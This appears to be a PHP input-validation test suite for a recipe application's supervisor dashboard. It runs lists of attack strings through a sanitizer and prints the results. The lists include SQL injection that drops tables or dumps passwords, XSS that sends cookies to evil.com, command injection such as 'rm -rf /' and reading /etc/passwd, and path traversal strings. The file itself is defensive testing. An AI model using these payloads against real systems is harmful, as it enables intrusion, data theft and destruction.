<?php
require_once 'includes/security.php';
require_once 'includes/db_connect.php';

class SupervisorInputTest {
    private $security;
    private $conn;
    private $testResults = [];

    public function __construct() {
        $this->security = new Security();
        $this->conn = $GLOBALS['conn'];
    }

    public function runAllTests() {
        // 1. SQL Injection Tests
        $this->testSQLInjection();
        
        // 2. XSS Tests
        $this->testXSS();
        
        // 3. CSRF Tests
        $this->testCSRF();
        
        // 4. File Upload Tests
        $this->testFileUpload();
        
        // 5. Command Injection Tests
        $this->testCommandInjection();
        
        // 6. Path Traversal Tests
        $this->testPathTraversal();
        
        // 7. Invalid Input Tests
        $this->testInvalidInput();
        
        // 8. Numeric Field Tests
        $this->testNumericFields();
        
        // 9. Email Field Tests
        $this->testEmailFields();
        
        // Display Results
        $this->displayResults();
    }

    private function testSQLInjection() {
        $sqlInjectionTests = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM admin_db--",
            "admin' --",
            "1; SELECT * FROM admin_db WHERE admin_id LIKE '%",
            "1' OR admin_id IS NOT NULL OR '1'='1",
            "recipe_name') VALUES ('hacked'); --",
            "' OR '1'='1' /*",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(username,':',password) FROM admin_db--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ];

        foreach ($sqlInjectionTests as $input) {
            $this->testInput('recipe_name', $input, 'SQL Injection');
            $this->testInput('search_query', $input, 'SQL Injection');
            $this->testInput('ingredient_name', $input, 'SQL Injection');
        }
    }

    private function testXSS() {
        $xssTests = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg/onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert(document.cookie)",
            "<img src=x oneoneror=alert(1)//",
            "<script>fetch('http://evil.com?c='+document.cookie)</script>",
            "<div onclick='alert(1)'>Click me</div>",
            "'-alert(1)-'",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
        ];

        foreach ($xssTests as $input) {
            $this->testInput('recipe_name', $input, 'XSS');
            $this->testInput('equipment', $input, 'XSS');
            $this->testInput('preparation_steps', $input, 'XSS');
        }
    }

    private function testCSRF() {
        $csrfTests = [
            '<form action="delete_recipe.php" method="POST"><input type="hidden" name="recipe_id" value="1"></form>',
            '<img src="x" onerror="document.forms[0].submit()">',
            '<body onload="document.forms[0].submit()">',
            '<script>fetch("update_recipe.php",{method:"POST",body:"id=1"})</script>'
        ];

        foreach ($csrfTests as $input) {
            $this->testInput('comments', $input, 'CSRF');
            $this->testInput('notes', $input, 'CSRF');
        }
    }

    private function testFileUpload() {
        $fileUploadTests = [
            'malicious.php',
            'script.php.jpg',
            '../../../etc/passwd',
            'shell.php%00.jpg',
            'test.exe',
            'test.php5',
            'test.phtml',
            'test.php.suspected',
            'test.jpg.php',
            '../../config.php'
        ];

        foreach ($fileUploadTests as $input) {
            $this->testInput('recipe_image', $input, 'File Upload');
            $this->testInput('attachment', $input, 'File Upload');
        }
    }

    private function testCommandInjection() {
        $commandTests = [
            '; ls -la',
            '| cat /etc/passwd',
            '& net user',
            '; rm -rf /',
            '| whoami',
            '; ping 127.0.0.1',
            '`` echo vulnerable``',
            '$(/etc/passwd)',
            '$(cat /etc/passwd)',
            '& dir'
        ];

        foreach ($commandTests as $input) {
            $this->testInput('recipe_name', $input, 'Command Injection');
            $this->testInput('equipment', $input, 'Command Injection');
        }
    }

    private function testPathTraversal() {
        $pathTests = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\cmd.exe',
            '%2e%2e%2f',
            '....//....//....//etc/passwd',
            '../../../etc/shadow\0',
            '..%252f..%252f..%252fetc/passwd',
            '/var/www/html/../../etc/passwd',
            '../../../../etc/passwd%00',
            '.../....//....//etc/passwd',
            '..%c0%af..%c0%af..%c0%afetc/passwd'
        ];

        foreach ($pathTests as $input) {
            $this->testInput('recipe_image', $input, 'Path Traversal');
            $this->testInput('attachment', $input, 'Path Traversal');
        }
    }

    private function testInvalidInput() {
        $invalidTests = [
            str_repeat('A', 10000),
            '⚠️🔥💀👾',
            '中文日本語한국어',
            '¥€£₹₽¢₪',
            '<>{}[]()~`!@#$%^&*+=',
            chr(0) . chr(1) . chr(2) . chr(3) . chr(4),
            "\x00\x01\x02\x03\x04\x05",
            "\r\n\t\v\f",
            "Null\0Byte",
            "Mixed\r\nNewlines\r\nAndSpecial\tCharacters"
        ];

        foreach ($invalidTests as $input) {
            $this->testInput('recipe_name', $input, 'Invalid Input');
            $this->testInput('equipment', $input, 'Invalid Input');
        }
    }

    private function testNumericFields() {
        $numericTests = [
            'abc',
            '-1',
            '0',
            '99999999999999999999',
            '1.2.3.4',
            '1,234,567',
            '1e+30',
            'NaN',
            'Infinity',
            '1/2'
        ];

        foreach ($numericTests as $input) {
            $this->testInput('quantity', $input, 'Numeric Field');
            $this->testInput('order_volume', $input, 'Numeric Field');
        }
    }

    private function testEmailFields() {
        $emailTests = [
            'test@test.com',
            'invalid.email',
            '@domain.com',
            'user@',
            'user@.com',
            'user.@domain.com',
            'user@domain@domain.com',
            'user+test@domain.com',
            str_repeat('a', 255) . '@domain.com',
            '<script>alert(1)</script>@domain.com'
        ];

        foreach ($emailTests as $input) {
            $this->testInput('email', $input, 'Email Field');
            $this->testInput('contact_email', $input, 'Email Field');
        }
    }

    private function testInput($field, $value, $testType) {
        try {
            $sanitizedValue = $this->security->validateRecipeInput($value, $field);
            $this->testResults[] = [
                'field' => $field,
                'input' => $value,
                'type' => $testType,
                'result' => $sanitizedValue === false ? 'BLOCKED' : 'SANITIZED',
                'sanitized_value' => $sanitizedValue,
                'status' => 'success'
            ];
        } catch (Exception $e) {
            $this->testResults[] = [
                'field' => $field,
                'input' => $value,
                'type' => $testType,
                'result' => 'ERROR',
                'message' => $e->getMessage(),
                'status' => 'error'
            ];
        }
    }

    private function displayResults() {
        echo "<html><head><title>Supervisor Input Test Results</title>";
        echo "<style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f4f4f4; }
            .success { color: green; }
            .error { color: red; }
            .blocked { color: orange; }
            .test-section { margin-bottom: 30px; }
            h2 { color: #333; margin-top: 20px; }
            .summary { background: #f9f9f9; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        </style></head><body>";
        
        echo "<h1>Supervisor Dashboard Security Test Results</h1>";
        
        // Display Summary
        $totalTests = count($this->testResults);
        $blocked = count(array_filter($this->testResults, fn($r) => $r['result'] === 'BLOCKED'));
        $sanitized = count(array_filter($this->testResults, fn($r) => $r['result'] === 'SANITIZED'));
        $errors = count(array_filter($this->testResults, fn($r) => $r['result'] === 'ERROR'));
        
        echo "<div class='summary'>";
        echo "<h2>Test Summary</h2>";
        echo "<p>Total Tests: {$totalTests}</p>";
        echo "<p>Blocked Attacks: {$blocked}</p>";
        echo "<p>Sanitized Inputs: {$sanitized}</p>";
        echo "<p>Errors: {$errors}</p>";
        echo "</div>";

        // Group results by test type
        $groupedResults = [];
        foreach ($this->testResults as $result) {
            $groupedResults[$result['type']][] = $result;
        }

        foreach ($groupedResults as $type => $results) {
            echo "<div class='test-section'>";
            echo "<h2>{$type} Tests</h2>";
            echo "<table>";
            echo "<tr><th>Field</th><th>Input</th><th>Result</th><th>Sanitized Value/Error</th></tr>";
            
            foreach ($results as $result) {
                $resultClass = $result['result'] === 'BLOCKED' ? 'blocked' : 
                             ($result['status'] === 'error' ? 'error' : 'success');
                
                echo "<tr>";
                echo "<td>" . htmlspecialchars($result['field']) . "</td>";
                echo "<td>" . htmlspecialchars($result['input']) . "</td>";
                echo "<td class='{$resultClass}'>" . htmlspecialchars($result['result']) . "</td>";
                echo "<td>" . htmlspecialchars($result['sanitized_value'] ?? $result['message'] ?? '') . "</td>";
                echo "</tr>";
            }
            
            echo "</table>";
            echo "</div>";
        }
        
        echo "</body></html>";
    }
}

// Run the tests
$tester = new SupervisorInputTest();
$tester->runAllTests(); 